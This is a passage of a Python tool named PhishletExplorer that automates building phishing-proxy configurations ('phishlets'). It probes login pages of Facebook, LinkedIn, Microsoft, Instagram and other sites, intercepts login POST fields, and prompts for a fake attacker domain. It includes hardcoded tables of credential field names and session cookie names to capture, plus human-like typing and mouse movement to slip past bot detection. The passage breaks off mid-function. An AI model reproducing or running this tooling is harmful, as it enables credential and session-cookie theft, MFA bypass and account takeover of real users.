#!/usr/bin/env python3

import os
import re
import json
import gzip
import random
import asyncio
import argparse
from urllib.parse import urlparse, urljoin, parse_qs
from collections import defaultdict
from typing import Dict, List, Set, Optional, Tuple
from enum import Enum

from colorama import init, Fore, Style
from playwright.async_api import async_playwright, Route, Page, BrowserContext

import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)


# ═══════════════════════════════════════════════════
#  Page state machine
# ═══════════════════════════════════════════════════

class PageState(Enum):
    UNKNOWN     = "unknown"
    LANDING     = "landing"
    EMAIL_ONLY  = "email_only"
    BOTH_FIELDS = "both_fields"
    LOGGED_IN   = "logged_in"
    ERROR       = "error"


# ═══════════════════════════════════════════════════
#  Domain helpers
# ═══════════════════════════════════════════════════

def split_fqdn(fqdn: str) -> Tuple[str, str]:
    parts = fqdn.lower().strip().split(".")
    if len(parts) >= 3:
        return ".".join(parts[:-2]), ".".join(parts[-2:])
    elif len(parts) == 2:
        return "", fqdn
    return "", fqdn


def registrable(fqdn: str) -> str:
    parts = fqdn.split(".")
    return ".".join(parts[-2:]) if len(parts) >= 2 else fqdn


NOISE_REGISTRABLE = {
    "google-analytics.com","googletagmanager.com","doubleclick.net",
    "googlesyndication.com","hotjar.com","segment.io","segment.com",
    "mixpanel.com","intercom.io","intercom.com","sentry.io",
    "newrelic.com","optimizely.com","fullstory.com","loggly.com",
    "datadoghq.com","amplitude.com","heap.io","clarity.ms",
    "bugsnag.com","rollbar.com","raygun.io","trackjs.com",
    "crazyegg.com","mouseflow.com","luckyorange.com",
    "googleusercontent.com","ggpht.com","googlevideo.com",
    "ytimg.com","gvt1.com","gvt2.com",
    "wp.com","wordpress.com","gravatar.com",
    "demdex.net","omtrdc.net","2mdn.net","serving-sys.com",
    "adsrvr.org","advertising.com","adnxs.com",
    "bing.com","msn.com",
}
NOISE_PATTERNS = [
    "analytics","telemetry","metrics.","beacon.",
    "stats.","pixel.","ads.","adservice","tracking",
    "recaptcha","captcha","demdex","omniture",
]

CDN_REGISTRABLE = {
    "cloudflare.com","cloudflareinsights.com","cloudflare.net",
    "twimg.com","akamaized.net","akamai.net",
    "fastly.net","jsdelivr.net","unpkg.com",
    "bootstrapcdn.com","jquery.com","gstatic.com",
    "googleapis.com","fonts.googleapis.com",
    "awsstatic.com","cloudfront.net","amazonaws.com",
    "scdn.co","spotifycdn.com","pscdn.co",
    "licdn.com","cdninstagram.com","fbsbx.com",
}
CDN_PATTERNS = ["cdn.","static.","assets.","media.","img.","images.","fonts."]

SITE_REQUIRED_DOMAINS: Dict[str, List[str]] = {
    "facebook.com": [
        "www.facebook.com",       
        "m.facebook.com",         
        "graph.facebook.com",     
        "connect.facebook.net",   
        "static.xx.fbcdn.net",    
        "scontent.xx.fbcdn.net",  
    ],
    "x.com": [
        "x.com",
        "abs.twimg.com",
        "pbs.twimg.com",
        "api.x.com",
    ],
    "twitter.com": [
        "twitter.com",
        "abs.twimg.com",
        "pbs.twimg.com",
        "api.twitter.com",
    ],
    "linkedin.com": [
        "www.linkedin.com",
        "static.licdn.com",
    ],
    "microsoftonline.com": [
        "login.microsoftonline.com",
        "aadcdn.msftauth.net",
        "aadcdn.msauthimages.net",
    ],
    "instagram.com": [
        "www.instagram.com",
        "scontent.cdninstagram.com",
    ],
    "spotify.com": [
        "accounts.spotify.com",
        "open.spotify.com",
    ],
}

OAUTH_REGISTRABLE = {
    "google.com","apple.com","github.com",
    "microsoft.com","accounts.google.com",
}

KNOWN_CREDENTIALS = {
    "linkedin.com":  ("session_key",   "session_password"),
    "facebook.com":  ("email",         "pass"),
    "instagram.com": ("username",      "enc_password"),
    "twitter.com":   ("log",           "pwd"),
    "x.com":         ("log",           "pwd"),
    "github.com":    ("login",         "password"),
    "reddit.com":    ("username",      "password"),
    "spotify.com":   ("username",      "password"),
    "discord.com":   ("login",         "password"),
    "twitch.tv":     ("username",      "password"),
    "amazon.com":    ("email",         "password"),
    "apple.com":     ("accountName",   "accountPassword"),
    "onlyfans.com":  ("email",         "password"),
    "tiktok.com":    ("email",         "password"),
    "snapchat.com":  ("username",      "password"),
    "microsoftonline.com": ("login",   "passwd"),
}

KNOWN_AUTH_COOKIES: Dict[str, List[str]] = {
    "linkedin.com":  ["li_at","li_rm","JSESSIONID","liap","bscookie"],
    "facebook.com":  ["c_user","xs","fr","datr","sb"],
    "instagram.com": ["sessionid","csrftoken","ds_user_id","rur","ig_did"],
    "x.com":         ["auth_token","ct0","twid","kdt","guest_id"],
    "twitter.com":   ["auth_token","ct0","twid","kdt","guest_id"],
    "spotify.com":   ["sp_dc","sp_key","__Host-sp_csrf_sid","sp_sso_csrf_token"],
    "onlyfans.com":  ["sess","fp","auth_uid","auth_hash","csrf","bcTokenSha"],
    "reddit.com":    ["reddit_session","token_v2","csv"],
    "github.com":    ["user_session","__Host-user_session_same_site","dotcom_user"],
    "discord.com":   ["__dcfduid","__sdcfduid","locale"],
    "tiktok.com":    ["sessionid","tt_webid_v2","passport_csrf_token"],
    "microsoftonline.com": ["ESTSAUTH","ESTSAUTHPERSISTENT","SignInStateCookie"],
}

KNOWN_AUTH_PATHS: Dict[str, List[str]] = {
    "linkedin.com":  ["/feed/","/mynetwork/","/jobs/","/messaging/"],
    "facebook.com": ["/", "/home.php"],
    "instagram.com": ["/","/direct/inbox/"],
    "x.com":         ["/home","/i/jf/stories/home"],
    "twitter.com":   ["/home"],
    "spotify.com":   ["/","/browse/"],
    "onlyfans.com":  ["/","/my/subscriptions/active"],
    "reddit.com":    ["/","/r/popular/"],
    "github.com":    ["/","/dashboard"],
}


def is_noise(fqdn: str) -> bool:
    reg = registrable(fqdn.lower())
    if reg in NOISE_REGISTRABLE: return True
    return any(p in fqdn.lower() for p in NOISE_PATTERNS)


def is_cdn(fqdn: str) -> bool:
    fqdn = fqdn.lower()
    if registrable(fqdn) in CDN_REGISTRABLE: return True
    return any(p in fqdn for p in CDN_PATTERNS)


def needs_session(fqdn: str) -> bool:
    if is_cdn(fqdn.lower()): return False
    if registrable(fqdn.lower()) in OAUTH_REGISTRABLE: return False
    return True


AD_TRACKING_REGISTRABLE = {
    "rubiconproject.com", "33across.com", "trkn.us", "3lift.com",
    "tealiumiq.com", "ns1p.net", "protechts.net",
    "moatads.com", "casalemedia.com", "openx.net",
    "pubmatic.com", "appnexus.com", "smartadserver.com",
    "criteo.com", "taboola.com", "outbrain.com",
    "scorecardresearch.com", "quantserve.com",
    "demdex.net", "omtrdc.net", "2mdn.net",
    "adobedtm.com", "nr-data.net", "btstatic.com",
    "pardot.com", "marketo.net", "eloqua.com",
}

def needs_proxy(fqdn: str, target_reg: str) -> bool:
    if is_noise(fqdn) or is_cdn(fqdn): return False
    fqdn_reg = registrable(fqdn.lower())
    if fqdn_reg in AD_TRACKING_REGISTRABLE: return False
    if "." not in fqdn or len(fqdn) < 4: return False
    if fqdn_reg == target_reg: return True
    if fqdn_reg in OAUTH_REGISTRABLE: return False
    social_noise = {
        "facebook.com","twitter.com","x.com","instagram.com",
        "youtube.com","linkedin.com","bing.com","msn.com",
    }
    if fqdn_reg in social_noise and fqdn_reg != target_reg: return False
    return True


# ═══════════════════════════════════════════════════
#  Field classification  ← NEW in v11.1
# ═══════════════════════════════════════════════════

USER_HINTS = [
    "email","user","login","log","username","phone","mobile",
    "identifier","session_key","accountname","text",
    "account_name","username_or_email","wa","wresult","wctx",
]
PASS_HINTS = [
    "pass","pwd","passwd","password","secret",
    "session_password","enc_password","accountpassword",
]
FORCE_OVERRIDES: Dict[str, str] = {
    "remember_me":       "1",
    "rememberme":        "1",
    "keep_me_signed_in": "1",
    "stay_signed_in":    "1",
    "persistent":        "1",
    "loginoptions":      "1",   
    "remembermfa":       "true", 
    "__ccg":             "GOOD",
}
DYNAMIC_FORCE_CANDIDATES: Set[str] = set() 
NOISE_KEYS = {
    "debug","impression","adsimpressionid","client_id","flow_token",
    "subtask","request_id","trace","correlation","correlation_id",
    "device","platform","version","app_version","sdk_version",
    "timestamp","nonce","state","scope","grant","grant_type",
    "response_type","redirect_uri","code_challenge","code_challenge_method",
    "ui_locales","claims","prompt","display","connection","realm",
}

VOLATILE_FORCE_KEYS = {
    "lsd", "jazoest", "__s", "__dyn", "__csr", "__hsi", "__hblp",
    "__sjsp", "__spin_t", "__spin_r", "__spin_b", "__rev", "__hsdp",
    "qpl_active_flow_ids", "fb_api_caller_class", "fb_api_req_friendly_name",
    "server_timestamps", "doc_id", "fb_api_analytics_tags",
    "__hs", "__hsrc", "__hcc", "__hd", "__hm", "__hn", "__hrc",
    "csrftoken", "csrf_token", "xsrf_token", "_csrf",
    "authenticity_token", "csrfmiddlewaretoken",
    "__requestverificationtoken", "requestverificationtoken",
    "state", "nonce", "code_verifier", "code_challenge",
    "callbackurl", "callback_url",
    "csrftoken", 
    "fb_dtsg", "ttstamp", "spin",
}

WHITELIST_FORCE_KEYS = {
    "remember_me", "rememberme", "keep_me_signed_in",
    "stay_signed_in", "persistent", "loginoptions",
    "remembermfa", "__ccg", "login",
}

FB_STATIC_PREFIXES = (
    "__", "fb_api_", "fb_dtsg", "jazoest", "lsd",
    "doc_id", "server_timestamps", "qpl_", "av",
    "dpr",
)

def _is_platform_metadata(key: str) -> bool:
    kl = key.lower()
    if kl in {"lsd", "jazoest", "__s"}:
        return False   
    if kl in {"__user", "__a", "__req", "__hs", "fb_dtsg"}:
        return False
    if any(kl.startswith(p) for p in FB_STATIC_PREFIXES):
        return True
    return False


def classify_post_fields(body_keys: List[str], body_dict: Dict = None, all_observed: Dict = None) -> Tuple[List[str], List[Dict]]:
    global DYNAMIC_FORCE_CANDIDATES
    search_keys: List[str] = []
    force_items: List[Dict] = []
    bd = body_dict or {}

    for k in body_keys:
        kl = k.lower().replace("-","_").replace("[","").replace("]","")

        if kl in NOISE_KEYS or len(k) > 80:
            continue

        is_pass     = any(h in kl for h in PASS_HINTS)
        is_user     = any(h in kl for h in USER_HINTS)
        is_override = FORCE_OVERRIDES.get(kl)
        is_platform = _is_platform_metadata(k)

        if is_pass or is_user:
            search_keys.append(k)

        elif is_override is not None:
            actual_val = str(bd.get(k, is_override))
            if k in VOLATILE_FORCE_KEYS:
                continue
            if len(actual_val) > 500:
                continue
            if actual_val and len(actual_val) <= 10 and not actual_val.startswith("{"):
                force_items.append({"key": k, "value": actual_val})
            else:
                force_items.append({"key": k, "value": is_override})

        elif all_observed is not None and k in all_observed:
            values_set = all_observed[k]
            kl = k.lower()

            if kl in VOLATILE_FORCE_KEYS:
                if k not in search_keys:
                    search_keys.append(k)
                continue

    
            if kl not in WHITELIST_FORCE_KEYS:
                if len(k) <= 30 and k not in search_keys:
                    search_keys.append(k)
                continue

            if len(values_set) == 1:
                unique_val = next(iter(values_set))
                if unique_val and len(unique_val) <= 20:
                    force_items.append({"key": k, "value": unique_val})
                    continue

        elif len(k) <= 30:
            search_keys.append(k)

    return search_keys, force_items

_VALID_KEY_RE = re.compile(r'^[A-Za-z_\[\]][A-Za-z0-9_\-\.\[\]\\]{0,79}$')

def is_valid_field_name(key: str) -> bool:
    if not key or len(key) < 1 or len(key) > 80: return False
    junk = re.compile(r'[«»]|[+/]{3,}|[A-Za-z0-9]{40,}|^\d+$|@|\s')
    if junk.search(key): return False
    return bool(_VALID_KEY_RE.match(key))


# ═══════════════════════════════════════════════════
#  Human-like helpers
# ═══════════════════════════════════════════════════

async def human_type(el, text: str, page: Page):
    try:
        await el.click()
        await page.wait_for_timeout(random.randint(150, 400))
        await el.fill("")
        await page.wait_for_timeout(random.randint(100, 250))
        for ch in text:
            await page.keyboard.type(ch)
            await page.wait_for_timeout(random.randint(40, 130))
    except Exception:
        pass


async def human_move(page: Page):
    try:
        for _ in range(random.randint(2, 4)):
            await page.mouse.move(
                random.randint(200, 1200),
                random.randint(100, 700)
            )
            await page.wait_for_timeout(random.randint(60, 180))
    except Exception:
        pass


# ═══════════════════════════════════════════════════
#  DOM scanner
# ═══════════════════════════════════════════════════

EMAIL_SELECTORS = [
    "[aria-label*='email' i]","[aria-label*='username' i]",
    "[aria-label*='phone' i]","[aria-label*='Phone, email' i]",
    "input[autocomplete='email']","input[autocomplete='username']",
    "input[autocomplete='tel']",
    "input[name='email']","input[name='username']","input[name='log']",
    "input[name='session_key']","input[name='identifier']","input[name='text']",
    "input[id*='email' i]","input[id*='username' i]","input[id*='user' i]",
    "input[type='email']",
    "input[placeholder*='email' i]","input[placeholder*='username' i]",
    "input[placeholder*='phone' i]",
]

PASSWORD_SELECTORS = [
    "input[type='password']",
    "input[autocomplete='current-password']",
    "input[autocomplete='new-password']",
    "input[name*='pass' i]","input[id*='pass' i]",
    "[aria-label*='password' i]",
]


async def scan_state(page: Page) -> Tuple[PageState, Optional[object], Optional[object]]:
    email_el = pass_el = None
    for sel in PASSWORD_SELECTORS:
        try:
            el = await page.query_selector(sel)
            if el and await el.is_visible():
                pass_el = el; break
        except Exception:
            continue
    for sel in EMAIL_SELECTORS:
        try:
            el = await page.query_selector(sel)
            if el and await el.is_visible():
                email_el = el; break
        except Exception:
            continue
    if pass_el and email_el: return PageState.BOTH_FIELDS, email_el, pass_el
    if pass_el:              return PageState.BOTH_FIELDS, None,     pass_el
    if email_el:             return PageState.EMAIL_ONLY,  email_el, None
    return PageState.LANDING, None, None


async def get_field_key(el) -> str:
    if el is None: return ""
    for attr in ("name","id","autocomplete"):
        v = await el.get_attribute(attr)
        if v:
            v = v.split()[-1] if " " in v else v
            if is_valid_field_name(v): return v
    ph = await el.get_attribute("placeholder") or ""
    if ph:
        return re.sub(r'[^a-z0-9_]','_', ph.lower().strip())[:30] or "field"
    return "field"


# ═══════════════════════════════════════════════════
#  Main class
# ═══════════════════════════════════════════════════

class PhishletExplorer:

    def __init__(self):
        self.target_url     = ""
        self.fake_domain    = ""
        self.phishlet_name  = ""
        self.headless       = False
        self.login_page_url = ""
        self.use_direct     = False
        self.has_account    = False
        self.account_email  = ""
        self.account_pass   = ""

        self.net_domains:     Set[str]            = set()
        self.cookie_map:      Dict[str, Set[str]] = defaultdict(set)
        self.storage_keys:    Set[str]            = set()
        self.js_token_names:  Set[str]            = set()
        self.login_forms:     List[Dict]          = []
        self.force_post_list: List[Dict]          = []
        self.auth_url_paths:  Set[str]            = set()
        self.all_post_keys:   Set[str]            = set()
        self.post_field_values: Dict[str, Set[str]] = defaultdict(set)

        self._cred_user    = ""
        self._cred_pass    = ""
        self._target_reg   = ""
        self._login_success = False

    # ─────────────────────────────────────────
    #  Banner + input
    # ─────────────────────────────────────────

    def _banner(self):
        banner = f"""
{Fore.CYAN}    ███████╗███████╗██████╗  ██████╗      ██████╗ ██████╗ ██████╗ ███████╗██╗  ██╗
    ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    ██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗██╔╝
      ███╔╝ █████╗  ██████╔╝██║   ██║    ██║     ██║   ██║██║  ██║█████╗   ╚███╔╝ 
     ███╔╝  ██╔══╝  ██╔══██╗██║   ██║    ██║     ██║   ██║██║  ██║██╔══╝   ██╔██╗ 
    ███████╗███████╗██║  ██║╚██████╔╝    ╚██████╗╚██████╔╝██████╔╝███████╗██╔╝ ██╗
    ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝      ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝

    {Fore.WHITE}-------------------------------------------------------------------------
    {Fore.CYAN}  [>] Developer: {Fore.WHITE}Momen Abu Assi   {Fore.CYAN}|  [>] Project: {Fore.WHITE}ZeroCodeX
    {Fore.WHITE}-------------------------------------------------------------------------
{Style.RESET_ALL}"""
        print(banner)
        time.sleep(0.5)
        print(f"{Fore.CYAN}[*] Checking System Status...")
        time.sleep(0.8)
        print(f"{Fore.CYAN}[+] Status: {Fore.GREEN}READY{Style.RESET_ALL}\n")

    def get_input(self):
        self._banner()
        while not self.target_url:
            u = input(f"{Fore.CYAN}[?] Target URL: {Fore.WHITE}").strip()
            if u: self.target_url = u if u.startswith("http") else "https://"+u

        while not self.fake_domain:
            d = input(f"{Fore.CYAN}[?] Fake domain (e.g. evil.com): {Fore.WHITE}").strip()
            if d: self.fake_domain = d.replace("https://","").replace("http://","")

        default_name = urlparse(self.target_url).netloc.split(".")[-2]
        n = input(f"{Fore.CYAN}[?] Phishlet name [{default_name}]: {Fore.WHITE}").strip()
        self.phishlet_name = n or default_name

        h = input(f"{Fore.CYAN}[?] Headless? (y/N): {Fore.WHITE}").strip().lower()
        self.headless = (h == "y")

        print(f"""
{Fore.YELLOW}[?] Login page:{Style.RESET_ALL}
  1. Auto-detect (click login button)
  2. Provide direct login URL
""")
        c = input(f"{Fore.GREEN}[?] Choice [1/2, default 1]: {Fore.WHITE}").strip()
        if c == "2":
            self.use_direct = True
            while not self.login_page_url:
                l = input(f"{Fore.CYAN}[?] Direct login URL: {Fore.WHITE}").strip()
                if l: self.login_page_url = l if l.startswith("http") else "https://"+l

        print(f"""
{Fore.YELLOW}[?] Real account mode (captures live POST traffic + session cookies):{Style.RESET_ALL}""")
        acc = input(f"{Fore.GREEN}[?] Have account? (y/N): {Fore.WHITE}").strip().lower()
        if acc == "y":
            self.has_account = True
            while not self.account_email:
                e = input(f"{Fore.CYAN}[?] Email/username: {Fore.WHITE}").strip()
                if e: self.account_email = e
            while not self.account_pass:
                import getpass
                p = getpass.getpass(f"{Fore.CYAN}[?] Password: {Fore.WHITE}")
                if p: self.account_pass = p

    # ─────────────────────────────────────────
    #  Network interceptor
    # ─────────────────────────────────────────

    async def _intercept(self, route: Route):
        req    = route.request
        url    = req.url
        method = req.method

        post_raw = None
        try:
            post_raw = req.post_data
        except Exception:
            try:
                buf = req.post_data_buffer
                if buf:
                    try:   post_raw = gzip.decompress(buf).decode("utf-8", errors="replace")
                    except Exception: post_raw = buf.hex()
            except Exception:
                pass

        try:
            parsed = urlparse(url)
            fqdn   = parsed.netloc
            path   = parsed.path

            base_fqdn = urlparse(self.target_url).netloc
            if fqdn and fqdn != base_fqdn and not is_noise(fqdn):
                fqdn_reg = registrable(fqdn.lower())
                
                required_fqdns = set()
                for site_key, fqdn_list in SITE_REQUIRED_DOMAINS.items():
                    if site_key in self._target_reg:
                        required_fqdns = {registrable(f) for f in fqdn_list}
                        break
                
                is_related = (
                    fqdn_reg == self._target_reg or
                    fqdn_reg in required_fqdns
                )
                
                if is_related:
                    self.net_domains.add(fqdn)

            body_keys: List[str] = []
            body_dict: Dict      = {} 
            if post_raw and isinstance(post_raw, str) and method == "POST":
                try:
                    bd = json.loads(post_raw)
                    if isinstance(bd, dict):
                        body_dict = bd
                        body_keys = [k for k in bd.keys() if k]
                except Exception:
                    try:
                        pq = parse_qs(post_raw, keep_blank_values=True)
                        body_dict = {k: v[0] for k, v in pq.items()}
                        body_keys = [k for k in pq.keys() if k]
                    except Exception:
                        pass
                self.all_post_keys.update(body_keys)
                for k, v in body_dict.items():
                    if isinstance(v, str):
                        self.post_field_values[k].add(v)

            login_url_hints = [
                "/login","/signin","/auth","/session","/token","/oauth",
                "/user","/account","/users/login","/v2/login","/v1/auth",
                "graphql","/onboarding","/flow","/checkpoint",
                "/api/login","/api/v1/login","/api/v2/login",
                "/login.php","/login/","/j_security_check",
                "/login.srf","/kmsi","/common/sas","/processsimplecreds",
            ]
            is_login_post = method == "POST" and body_keys and (
                any(p in url.lower() for p in login_url_hints) or
                any(any(h in k.lower() for h in PASS_HINTS) for k in body_keys)
            )

            if is_login_post:
                search_keys, force_items = classify_post_fields(body_keys, body_dict, self.post_field_values)
                if not search_keys:
                    search_keys = [k for k in body_keys
                                   if k and len(k) <= 40
                                   and k.lower() not in NOISE_KEYS][:8]

                search_items = [{"key": k, "search": "(.*)"} for k in search_keys]
                entry = {
                    "path":   path,
                    "search": search_items,
                    "force":  force_items,
                    "type":   "post",
                }

                if 'recaptcha' in path or 'userverify' in path:
                    pass
                else:
                    existing = [e for e in self.force_post_list if e["path"] == path]
                    is_dup   = any(
                        {s["key"] for s in e["search"]} == set(search_keys)
                        for e in existing
                    )
                    if not is_dup:
                        self.force_post_list.append(entry)
                        force_label = (" force=[" + ", ".join(fi["key"] for fi in force_items) + "]") if force_items else ""
                        print(f"{Fore.GREEN}  [✓] force_post: {path}  search=[{', '.join(search_keys[:4])}]{force_label}{Style.RESET_ALL}")
                
                
                for k in body_keys:
                    kl = k.lower()
                    if k == "__user":
                        continue
                    if _is_platform_metadata(k):
                        continue  
                    if any(h in kl for h in PASS_HINTS) and is_valid_field_name(k):
                        self._cred_pass = k
                    if any(h in kl for h in USER_HINTS) and is_valid_field_name(k):
                        self._cred_user = k

            auth_hints = [
                "/home","/dashboard","/feed","/console","/me",
                "/profile","/account","/settings","/explore",
                "/library","/subscriptions",
                "/cabinet","/panel","/portal","/workspace",
                "/user/profile","/user/settings", "/welcome","/start",
            ]
            import re as _re2
            is_simple_path = (
                len(path) <= 40 and
                not _re2.search(r'/[0-9]{8,}', path) and
                "/messages/t/" not in path and
                "/notifications/client/" not in path
            )
            if is_simple_path and any(p in path.lower() for p in auth_hints):
                self.auth_url_paths.add(path)

        except Exception:
            pass
        finally:
            try:
                await route.continue_()
            except Exception:
                pass

    # ─────────────────────────────────────────
    #  Login flow — state machine
    # ─────────────────────────────────────────

    async def _run_login_flow(self, page: Page):
        state, email_el, pass_el = await scan_state(page)
        print(f"{Fore.CYAN}  [*] Page state: {state.value}{Style.RESET_ALL}")

        if state == PageState.BOTH_FIELDS:
            await self._fill_and_submit(page, email_el, pass_el)
            return

        if state == PageState.LANDING and not self.use_direct:
            if await self._click_login_btn(page):
                await self._smart_wait(page, 2000)
                state, email_el, pass_el = await scan_state(page)

        if state == PageState.BOTH_FIELDS:
            await self._fill_and_submit(page, email_el, pass_el)
            return

        if state == PageState.EMAIL_ONLY and email_el:
            await self._fill_email_step(page, email_el)
            print(f"{Fore.YELLOW}  [*] Multi-step login — waiting for password field...{Style.RESET_ALL}")
            password_appeared = False
            for attempt in range(3):  
                try:
                    await page.wait_for_selector(
                        ", ".join(PASSWORD_SELECTORS[:3]),
                        timeout=20000, state="visible"
                    )
                    password_appeared = True
                    print(f"{Fore.GREEN}  [✓] Password field appeared{Style.RESET_ALL}")
                    break
                except Exception:
                    if attempt < 2:
                        print(f"{Fore.YELLOW}  [*] Retry {attempt+1}: clicking Next again...{Style.RESET_ALL}")
                        await self._click_next(page)
                        await page.wait_for_timeout(3000)
            if not password_appeared:
                print(f"{Fore.YELLOW}  [!] Password field did not appear after 3 attempts{Style.RESET_ALL}")
            await page.wait_for_timeout(1500)
            state2, email_el2, pass_el2 = await scan_state(page)
            if pass_el2:
                await self._fill_and_submit(page, email_el2, pass_el2)
                return

        print(f"{Fore.YELLOW}  [!] Login fields not found — will extract from DOM{Style.RESET_ALL}")

    async def _fill_email_step(self, page: Page, email_el):
        text = self.account_email if self.has_account else "probe@example.com"
        print(f"{Fore.YELLOW}  [*] Step 1 — email: {text}{Style.RESET_ALL}")
        await human_type(email_el, text, page)
        await page.wait_for_timeout(random.randint(400, 800))
        await self._click_next(page)
        await page.wait_for_timeout(random.randint(800, 1500))

    async def _fill_and_submit(self, page: Page, email_el, pass_el):
        ukey = await get_field_key(email_el) if email_el else ""
        pkey = await get_field_key(pass_el)  if pass_el  else "password"
        INVALID_FIELD_NAMES = {"field", "input", "text", "form", "value", "data"}
        if ukey and is_valid_field_name(ukey) and ukey not in INVALID_FIELD_NAMES:
            self._cred_user = ukey
        if pkey and is_valid_field_name(pkey) and pkey not in INVALID_FIELD_NAMES:
            self._cred_pass = pkey
        print(f"{Fore.GREEN}  [✓] Fields: user='{ukey}' pass='{pkey}'{Style.RESET_ALL}")

        if not self.has_account:
            return

        print(f"{Fore.YELLOW}  [*] Logging in as {self.account_email}...{Style.RESET_ALL}")
        if email_el:
            await human_type(email_el, self.account_email, page)
            await page.wait_for_timeout(random.randint(300, 600))
        if pass_el:
            await human_type(pass_el, self.account_pass, page)
            await page.wait_for_timeout(random.randint(400, 800))
        await self._click_submit(page)

        print(f"{Fore.YELLOW}  [*] Waiting for login result...{Style.RESET_ALL}")

        captcha_indicators = [
            "captcha", "checkpoint", "challenge", "verify",
            "suspicious", "unusual", "confirm", "robot",
            "recaptcha", "hcaptcha", "arkose"
        ]
        twofa_indicators = ["two-factor", "2fa", "otp", "verification"]
        success_indicators = [
            "/home", "/feed", "/dashboard", "/profile", "/me/",
            "/account", "/?sk=", "/friends",
            "/cabinet", "/panel", "/portal", "/workspace",
            "/user/", "/overview", "/welcome", "/start",
            "/subscriptions", "/library",
        ]
        fail_indicators    = ["/login", "/signin", "/auth", "/password"]

        captcha_warned  = False
        challenge_count = 0   
        deadline        = None

        while True:
            await page.wait_for_timeout(2500)
            current_url  = page.url
            current_path = urlparse(current_url).path.lower()
            full_lower   = current_url.lower()

            on_captcha = (
                any(c in full_lower for c in captcha_indicators) or
                await self._page_has_captcha(page)
            )
            on_2fa = any(c in full_lower for c in twofa_indicators)

            if on_captcha or on_2fa:
                deadline = None 
                challenge_count += 1
                if not captcha_warned or challenge_count % 10 == 0:
                    kind = "2FA" if on_2fa else "CAPTCHA"
                    print(f"{Fore.YELLOW}  [!] {kind} — solve it manually in the browser.{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}  [i] Script is waiting with no time limit...{Style.RESET_ALL}")
                    captcha_warned = True
                if captcha_warned and not await self._page_has_captcha(page):
                    if not any(c in full_lower for c in captcha_indicators):
                        print(f"{Fore.GREEN}  [✓] CAPTCHA solved — continuing...{Style.RESET_ALL}")
                        captcha_warned = False
                        deadline = None
                continue

            if any(s in current_path for s in success_indicators):
                print(f"{Fore.GREEN}  [✓] Login successful! → {current_url[:70]}{Style.RESET_ALL}")
                self._login_success = True
                return

            if (captcha_warned or challenge_count > 0):
                not_on_login = not any(f in current_path for f in fail_indicators)
                not_on_captcha = not any(c in full_lower for c in captcha_indicators)
                if not_on_login and not_on_captcha:
                    print(f"{Fore.GREEN}  [✓] CAPTCHA completed and navigated to the page: {current_url[:60]}{Style.RESET_ALL}")
                    self._login_success = True
                    return

            if any(f in current_path for f in fail_indicators):
                if deadline is None:
                    deadline = asyncio.get_event_loop().time() + 40
                if asyncio.get_event_loop().time() > deadline:
                    print(f"{Fore.RED}  [!] Login failed (still on login page).{Style.RESET_ALL}")
                    return
                continue

            captcha_warned = False
            if deadline is None:
                deadline = asyncio.get_event_loop().time() + 25
            if asyncio.get_event_loop().time() > deadline:
                print(f"{Fore.YELLOW}  [!] Timeout on intermediate page — continuing.{Style.RESET_ALL}")
                return

    async def _wait_for_page_ready(self, page: Page, max_wait: int = 100):
        print(f"{Fore.CYAN}  [*] Waiting for page to load...{Style.RESET_ALL}")
        deadline = asyncio.get_event_loop().time() + max_wait
        checked_captcha = False

        while True:
            state, email_el, pass_el = await scan_state(page)
            if state in (PageState.EMAIL_ONLY, PageState.BOTH_FIELDS):
                print(f"{Fore.GREEN}  [✓] Login page ready{Style.RESET_ALL}")
                return

            if await self._page_has_captcha(page):
                if not checked_captcha:
                    print(f"{Fore.YELLOW}  [!] CAPTCHA on login page — waiting up to {max_wait}s...{Style.RESET_ALL}")
                    checked_captcha = True
                await page.wait_for_timeout(3000)
                continue

            if asyncio.get_event_loop().time() > deadline:
                print(f"{Fore.YELLOW}  [!] Page ready timeout — proceeding anyway{Style.RESET_ALL}")
                return

            await page.wait_for_timeout(2000)

    async def _page_has_captcha(self, page: Page) -> bool:
        try:
            captcha_selectors = [
                "iframe[src*='recaptcha']",
                "iframe[src*='hcaptcha']",
                "iframe[src*='arkose']",
                "iframe[src*='funcaptcha']",
                ".g-recaptcha",
                "#captcha",
                "[data-testid*='captcha']",
                "[class*='captcha']",
                "[id*='captcha']",
                "iframe[title*='captcha' i]",
                "iframe[title*='security' i]",
            ]
            for sel in captcha_selectors:
                try:
                    el = await page.query_selector(sel)
                    if el and await el.is_visible():
                        return True
                except Exception:
                    continue

            try:
                content = await page.evaluate(
                    "() => document.body ? document.body.innerText.toLowerCase() : ''"
                )
                captcha_texts = [
                    "complete a security check",
                    "verify you're human",
                    "prove you're not a robot",
                    "security check",
                    "حل التحقق",
                ]
                if any(t in content for t in captcha_texts):
                    return True
            except Exception:
                pass

        except Exception:
            pass
        return False

    async def _click_login_btn(self, page: Page) -> bool:
        sels = [
            'a[href*="login"]','a[href*="signin"]','a[href*="sign-in"]',
            'button:has-text("Sign in")','button:has-text("Log in")',
            'button:has-text("Login")','button:has-text("Get started")',
            'a:has-text("Sign in")','a:has-text("Log in")','a:has-text("Login")',
            '[data-testid*="login"]','[data-testid*="signin"]',
            '[aria-label*="sign in" i]','[aria-label*="log in" i]',
        ]
        for sel in sels:
            try:
                btn = await page.wait_for_selector(sel, timeout=3000, state="visible")
                if btn:
                    await page.wait_for_timeout(random.randint(300,700))
                    await btn.click()
                    print(f"{Fore.GREEN}  [✓] Clicked: {sel}{Style.RESET_ALL}")
                    return True
            except Exception:
                continue
        return False

    async def _click_next(self, page: Page) -> bool:
        sels = [
            'button[type="submit"]',
            'button:has-text("Next")','button:has-text("Continue")',
            'button:has-text("Log in")','button:has-text("Sign in")',
            '[data-testid*="next"]','[data-testid*="login-button"]',
            '[data-testid="LoginButton"]','input[type="submit"]',
        ]
        for sel in sels:
            try:
                btn = await page.query_selector(sel)
                if btn and await btn.is_visible():
                    await page.wait_for_timeout(random.randint(200,500))
                    await btn.click()
                    return True
            except Exception:
                continue
        try:
            await page.keyboard.press("Enter")
            return True
        except Exception:
            pass
        return False

    async def _click_submit(self, page: Page) -> bool:
        sels = [
            'button[type="submit"]','input[type="submit"]',
            'button:has-text("Log in")','button:has-text("Sign in")',
            'button:has-text("Login")','button:has-text("Continue")',
